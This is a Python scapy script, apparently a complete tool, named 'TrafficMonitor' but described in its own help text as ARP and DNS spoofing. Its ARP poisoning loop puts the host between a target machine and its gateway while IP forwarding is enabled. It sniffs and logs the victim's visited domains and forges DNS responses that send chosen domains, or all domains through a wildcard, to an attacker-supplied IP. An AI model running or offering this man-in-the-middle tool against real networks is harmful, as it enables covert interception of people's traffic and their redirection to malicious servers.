
import sys
import os
import time
import threading
import logging
import argparse
from scapy.all import *

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class TrafficMonitor(threading.Thread):
    def __init__(self, target_ip, gateway_ip, spoof_dns_domains=None, interface=None):
        super().__init__()
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.spoof_dns_domains = spoof_dns_domains or {} # {'example.com': '1.2.3.4'}
        self.stop_event = threading.Event()
        self.target_mac = None
        self.gateway_mac = None
        
        self.statistics = {
            "upload_bytes": 0,
            "download_bytes": 0,
            "top_domains": [],
            "protocols": {}
        }

    def _get_mac(self, ip):
        """Resolves MAC address for a given IP."""
        try:
            logging.info(f"Resolving MAC for {ip}...")
            # Send ARP request to get MAC
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0, iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
        except Exception as e:
            logging.error(f"Error resolving MAC: {e}")
        return None

    def enable_ip_forwarding(self):
        """Enables IP forwarding on the system."""
        try:
            if sys.platform == "darwin":
                os.system('sysctl -w net.inet.ip.forwarding=1')
            else:
                 # Linux
                os.system('sysctl -w net.ipv4.ip_forward=1')
            logging.info("IP Forwarding enabled.")
        except Exception as e:
            logging.error(f"Failed to enable IP forwarding: {e}")

    def disable_ip_forwarding(self):
        """Disables IP forwarding."""
        try:
             if sys.platform == "darwin":
                os.system('sysctl -w net.inet.ip.forwarding=0')
             else:
                os.system('sysctl -w net.ipv4.ip_forward=0')
             logging.info("IP Forwarding disabled.")
        except Exception as e:
            logging.error(f"Failed to disable IP forwarding: {e}")

    def _arp_spoof_loop(self):
        """Continuously sends forged ARP packets."""
        logging.info("Starting ARP spoofing loop...")
        while not self.stop_event.is_set():
            try:
                # Tell Target that Gateway is Me
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=self.target_mac), verbose=0, iface=self.interface)
                # Tell Gateway that Target is Me
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=self.gateway_mac), verbose=0, iface=self.interface)
            except Exception as e:
                logging.error(f"Error in ARP spoof loop: {e}")
            time.sleep(2)

    def restore_arp(self):
        """Restores ARP tables."""
        logging.info("Restoring ARP tables...")
        try:
            if self.target_mac and self.gateway_mac:
                # Restore Target: Tell Target valid Gateway MAC
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac), count=5, verbose=0, iface=self.interface)
                # Restore Gateway: Tell Gateway valid Target MAC
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=5, verbose=0, iface=self.interface)
        except Exception as e:
            logging.error(f"Error restoring ARP: {e}")

    def _dns_spoof(self, pkt):
        """Spoofs DNS responses if domain matches."""
        # Only process DNS Queries (qr=0) that are UDP
        if DNS in pkt and pkt[DNS].qr == 0 and UDP in pkt:
            try:
                qname = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
                
                # Check directly or wildcard
                spoofed_ip = self.spoof_dns_domains.get(qname)
                if not spoofed_ip and '*' in self.spoof_dns_domains:
                     spoofed_ip = self.spoof_dns_domains['*'] # Wildcard

                if spoofed_ip:
                    logging.info(f"Spoofing DNS query for {qname} -> {spoofed_ip}")
                    
                    # Create spoofed response
                    # Swap src/dst IP and ports
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                      an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoofed_ip))
                    
                    send(spoofed_pkt, verbose=0, iface=self.interface)
                    return True
            except Exception as e:
                logging.error(f"Error spoofing DNS: {e}")
        return False

    def sniff_packets(self, pkt):
        """Callback for packet processing."""
        # 1. DNS Spoofing Check
        self._dns_spoof(pkt)

        # 2. Statistics
        if IP in pkt:
            self.statistics["upload_bytes"] += len(pkt)
            self.statistics["download_bytes"] += len(pkt)

        if DNSQR in pkt and pkt[DNSQR].qtype == 1: # A Record
            try:
                domain = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
                if domain not in self.statistics["top_domains"]:
                    self.statistics["top_domains"] = (self.statistics["top_domains"] + [domain])[:5]
                    logging.info(f"Visited Domain: {domain}")
            except Exception:
                pass

        # 3. SNI (Server Name Indication) Extraction for HTTPS
        if TCP in pkt and len(pkt) > 53:
            try:
                # Basic check for TLS Handshake (0x16) at start of payload
                payload = bytes(pkt[TCP].payload)
                if len(payload) > 5 and payload[0] == 0x16:
                   pass # TODO limit stats in this demo
            except Exception:
                pass

    def run(self):
        logging.info(f"Initializing TrafficMonitor for Target: {self.target_ip}, Gateway: {self.gateway_ip}")
        
        # 1. Resolve MACs
        self.target_mac = self._get_mac(self.target_ip)
        self.gateway_mac = self._get_mac(self.gateway_ip)

        if not self.target_mac:
            logging.error(f"Could not resolve MAC for target {self.target_ip}. Host might be down.")
            return
        if not self.gateway_mac:
            logging.error(f"Could not resolve MAC for gateway {self.gateway_ip}. Host might be down.")
            return

        logging.info(f"Target MAC: {self.target_mac} | Gateway MAC: {self.gateway_mac}")

        # 2. Enable Forwarding
        self.enable_ip_forwarding()
        
        # 3. Start ARP Spoofing Thread
        arp_thread = threading.Thread(target=self._arp_spoof_loop, daemon=True)
        arp_thread.start()

        # 4. Start Sniffing (Blocking)
        logging.info(f"Sniffing started on {self.interface or 'default'}...")
        try:
            # We filter for IP packets to avoid clutter, but keep ARP/DNS logic reachable
            sniff(
                prn=self.sniff_packets, 
                store=0, 
                stop_filter=lambda x: self.stop_event.is_set(),
                iface=self.interface
            )
        except Exception as e:
            logging.error(f"Sniffer error: {e}")
        finally:
            self.stop()

    def stop(self):
        if self.stop_event.is_set():
            return  # Already stopped
        logging.info("Stopping TrafficMonitor...")
        self.stop_event.set()
        time.sleep(1) # Give threads time to notice
        self.restore_arp()
        self.disable_ip_forwarding()
        logging.info("Stopped.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Traffic Monitor with ARP & DNS Spoofing")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-i", "--interface", help="Network interface (e.g., eth0, wlan0)")
    parser.add_argument("--dns", help="Domain to spoof (format: domain=ip)", action="append") # --dns example.com=1.2.3.4
    
    args = parser.parse_args()
    
    # Needs root/admin privileges
    if os.geteuid() != 0:
        logging.error("This script requires root privileges. Please run with sudo.")
        sys.exit(1)

    dns_map = {}
    if args.dns:
        for item in args.dns:
            try:
                parts = item.split('=')
                if len(parts) == 2:
                    dns_map[parts[0]] = parts[1]
            except ValueError:
                pass
    
    monitor = TrafficMonitor(args.target, args.gateway, spoof_dns_domains=dns_map, interface=args.interface)
    monitor.start()
    
    try:
        # Keep main thread alive to catch KeyboardInterrupt
        while monitor.is_alive():
            monitor.join(1)
    except KeyboardInterrupt:
        monitor.stop()
